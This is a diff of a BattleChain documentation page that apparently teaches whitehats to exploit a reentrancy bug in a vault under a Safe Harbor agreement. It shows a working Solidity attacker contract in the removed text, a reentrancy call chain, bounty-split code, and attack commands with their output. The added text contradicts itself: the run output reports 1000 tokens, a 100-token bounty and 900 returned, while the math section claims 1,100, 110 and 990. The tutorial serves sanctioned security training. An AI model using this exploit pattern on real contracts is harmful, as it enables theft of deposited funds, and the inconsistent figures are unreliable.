@@ -1,177 +1,135 @@
 ---
 title: "Execute Your First Attack"
-description: "A step-by-step tutorial to find and attack your first contract on BattleChain"
+description: "Exploit the CEI violation in a live BattleChain vault, collect your bounty, and walk away clean under Safe Harbor."
 ---
 
-This tutorial walks you through finding an attackable contract, verifying its Safe Harbor terms, and executing a legal attack. By the end, you'll understand the complete whitehat workflow.
+<div className="flex items-start gap-4 mb-10 p-5 rounded-xl border border-red-600/40 bg-red-950/20">
+  <div className="text-4xl mt-1">⚔️</div>
+  <div>
+    <div className="text-xs font-bold uppercase tracking-widest text-red-400 mb-1">You are the Whitehat</div>
+    <div className="text-base font-semibold text-gray-100 mb-1">The vault is live. The DAO approved it. You know exactly what's wrong with it.</div>
+    <div className="text-sm text-gray-400">You spotted a CEI violation and you have a contract that exploits it. The Safe Harbor agreement is in place — what you're about to do is legal, structured, and profitable.</div>
+  </div>
+</div>
 
-<Note>
+## Prerequisites
 
-**Prerequisites**: Familiarity with smart contract security and Solidity.
+You'll need [Foundry](https://book.getfoundry.sh/getting-started/installation) and [just](https://just.systems) installed, and the starter repo cloned:
 
-</Note>
-
-## What You'll Do
-
-1. Find an attackable contract
-2. Review the Safe Harbor agreement
-3. Execute an attack
-4. Handle recovered funds correctly
-
-## Step 1: Find an Attackable Contract
-
-Query the `AttackRegistry` to check if a contract is attackable:
-
-```solidity
-// Check if a specific contract is in attack mode
-bool isAttackable = attackRegistry.isTopLevelContractUnderAttack(targetContract);
-
-if (isAttackable) {
-    // This contract can be legally attacked under Safe Harbor
-}
+```bash
+git clone https://github.com/Cyfrin/battlechain-starter
+cd battlechain-starter
+forge install
 ```
 
-To find contracts to attack, monitor for `AgreementStateChanged` events:
+If you haven't already, import your key into Foundry's encrypted keystore:
 
-```solidity
-event AgreementStateChanged(address indexed agreementAddress, ContractState newState);
-
-// newState = 3 (UNDER_ATTACK) means contracts are attackable
-// newState = 4 (PROMOTION_REQUESTED) means still attackable during 3-day delay
+```bash
+cast wallet import battlechain --interactive
 ```
 
-## Step 2: Get the Agreement Details
+You'll also need a `VAULT_ADDRESS` and `TOKEN_ADDRESS` to target. If you're attacking your own vault from [Deploy Your First Contract](/battlechain/quickstart/deploy-first-contract), those are already in your `.env`. If you're targeting someone else's vault, get those addresses from them or by querying the `AttackRegistry`.
 
-Once you find an attackable contract, get its agreement:
+Your `.env` should have:
+
+```bash
+SENDER_ADDRESS=0x...your_wallet_address...
+TOKEN_ADDRESS=0x...
+VAULT_ADDRESS=0x...
+RECOVERY_ADDRESS=0x...
+```
+
+No private key — your keystore handles signing when prompted.
+
+---
+
+## Verify the Vault is Attackable
+
+Before doing anything, confirm the vault is in `UNDER_ATTACK` state:
+
+```bash
+just check-state
+```
+
+You need to see `3`. If you see `2`, the DAO hasn't approved yet. Anything else and the vault isn't eligible.
+
+---
+
+## Understand the Exploit
+
+Open `src/Attacker.sol`. The attack exploits two things working together: the CEI violation in `VulnerableVault` and the hook system in `MockToken`.
+
+**MockToken's hook system:** Any address can register a hook contract via `setTransferHook(address hook)`. When tokens are transferred *to* that address, the token calls `hook.onTokenTransfer()` after the transfer completes.
+
+**The vault's CEI violation:** `withdrawAll()` calls `TOKEN.transfer()` *before* zeroing `balances[msg.sender]`.
+
+Put them together and the reentrancy chain looks like this:
+
+```
+attack()
+└── TOKEN.setTransferHook(address(this))  ← register as our own hook
+└── vault.deposit(seedAmount)             ← establish a balance
+└── vault.withdrawAll()
+    └── TOKEN.transfer(attacker, amount)
+        └── onTokenTransfer()             ← hook fires, balance not yet zeroed
+            └── vault.withdrawAll()
+                └── TOKEN.transfer(attacker, amount)
+                    └── onTokenTransfer() ← still not zeroed
+                        └── ...           ← repeats until vault is empty
+```
+
+Once the vault is drained, the Safe Harbor settlement runs automatically:
 
 ```solidity
-// Get the agreement for this contract
-address agreementAddr = attackRegistry.getAgreementForContract(targetContract);
+uint256 total = TOKEN.balanceOf(address(this));
+uint256 bounty = (total * BOUNTY_BPS) / 10_000; // 10%
 
-// Get agreement details
-IAgreement agreement = IAgreement(agreementAddr);
-AgreementDetails memory details = agreement.getDetails();
+TOKEN.transfer(RECOVERY_ADDRESS, total - bounty); // return 90% to protocol
+TOKEN.transfer(OWNER, bounty);                    // keep 10%
+```
 
-// Check bounty terms
-BountyTerms memory terms = details.bountyTerms;
-uint256 bountyPercent = terms.bountyPercentage;  // e.g., 10 for 10%
-uint256 bountyCap = terms.bountyCapUsd;          // e.g., 5_000_000 for $5M
-bool canRetain = terms.retainable;                // Can you keep from recovered funds?
+You're not stealing. The protocol gets the majority of funds back minus the agreed bounty. Everyone knew the rules when the agreement was signed.
+
+---
+
+## Run the Attack
+
+```bash
+just attack
+```
+
+Watch the output:
+
+```
+Vault balance before: 1000 tokens
+Deploying attacker...
+
+--- Vault drained ---
+Vault before:          1000 tokens
+Vault after:              0 tokens
+Bounty kept:            100 tokens
+Returned to protocol:   900 tokens
 ```
 
 <Check>
-You now know the bounty terms. In this example: 10% bounty, \$5M cap, retainable.
+You've executed a legal reentrancy exploit on BattleChain. The vault is empty, the protocol has their funds back minus your bounty, and you're protected under Safe Harbor.
 </Check>
 
-## Step 3: Verify the Contract is in Scope
+---
 
-Double-check the contract is covered:
+## Verify the Math
 
-```solidity
-// Verify contract is in the agreement's scope
-bool inScope = agreement.isContractInScope(targetContract);
-require(inScope, "Contract not in scope - no Safe Harbor protection!");
+The agreement set a 10% bounty (`BOUNTY_BPS = 1_000`). The vault had 1,000 seeded tokens plus your 100 seed tokens = 1,100 total.
 
-// Verify agreement is valid (created by official factory)
-bool validAgreement = safeHarborRegistry.isAgreementValid(agreementAddr);
-require(validAgreement, "Invalid agreement!");
-```
+- Bounty: `1,100 × 10% = 110 tokens`
+- Returned: `1,100 - 110 = 990 tokens`
 
-## Step 4: Get the Recovery Address
+If the numbers don't look right, check that `RECOVERY_ADDRESS` in your `.env` matches the address in the agreement — that's where the returned funds go.
 
-Note where to send recovered funds:
+---
 
-```solidity
-// Get the asset recovery address for BattleChain
-string memory recoveryAddrStr = agreement.getAssetRecoveryAddress("eip155:325");
-// Parse to address (you'll need a helper for this)
-address recoveryAddress = parseAddress(recoveryAddrStr);
-```
+## What Happens on the Protocol Side
 
-## Step 5: Execute Your Attack
+The protocol sees their recovery address receive 900 tokens. They now know their vault has a reentrancy vulnerability. If the same code were deployed on mainnet with real TVL, the loss would have been real.
 
-Now execute your exploit. Here's an example attacking a reentrancy vulnerability:
-
-```solidity
-contract Attacker {
-    IVulnerableVault public target;
-    address public recoveryAddress;
-    uint256 public bountyPercent;
-
-    constructor(address _target, address _recovery, uint256 _bountyPercent) {
-        target = IVulnerableVault(_target);
-        recoveryAddress = _recovery;
-        bountyPercent = _bountyPercent;
-    }
-
-    function attack() external payable {
-        // Deposit to set up the attack
-        target.deposit{value: msg.value}();
-        // Trigger the vulnerable withdraw
-        target.withdraw(msg.value);
-    }
-
-    receive() external payable {
-        // Reentrancy exploit
-        if (address(target).balance >= 1 ether) {
-            target.withdraw(1 ether);
-        }
-    }
-
-    function handleRecoveredFunds() external {
-        uint256 total = address(this).balance;
-
-        // Calculate bounty (e.g., 10%)
-        uint256 bounty = (total * bountyPercent) / 100;
-
-        // Send remainder to recovery address
-        uint256 toReturn = total - bounty;
-        payable(recoveryAddress).transfer(toReturn);
-
-        // Keep your bounty
-        payable(msg.sender).transfer(bounty);
-    }
-}
-```
-
-## Step 6: Handle Funds Correctly
-
-After a successful attack:
-
-<Steps>
-  <Step title="Calculate Your Bounty">
-    ```
-    Bounty = min(RecoveredAmount x BountyPercentage%, BountyCapUsd)
-    ```
-  </Step>
-  <Step title="Send Remainder to Recovery">
-    Transfer `RecoveredAmount - Bounty` to the recovery address
-  </Step>
-  <Step title="Keep Your Bounty">
-    The remaining amount is yours
-  </Step>
-</Steps>
-
-<Check>
-You've completed your first attack! The protocol received their funds (minus your bounty), and you're protected under Safe Harbor.
-</Check>
-
-## Step 7: Document Everything
-
-Keep records of:
-- The contract you attacked
-- The vulnerability exploited
-- Transaction hashes
-- Your bounty calculation
-- Funds sent to recovery
-
-## What's Next?
-
-<CardGroup cols={2}>
-  <Card title="How to Claim Bounties" icon="coins" href="/battlechain/how-to/claim-bounties">
-    Learn more about bounty calculations and caps
-  </Card>
-  <Card title="Safe Harbor Protection" icon="shield" href="/battlechain/explanation/safe-harbor">
-    Understand your legal protections
-  </Card>
-</CardGroup>
+That's the whole point. See [Deploy Your First Contract](/battlechain/quickstart/deploy-first-contract) if you want to experience the other side of this.
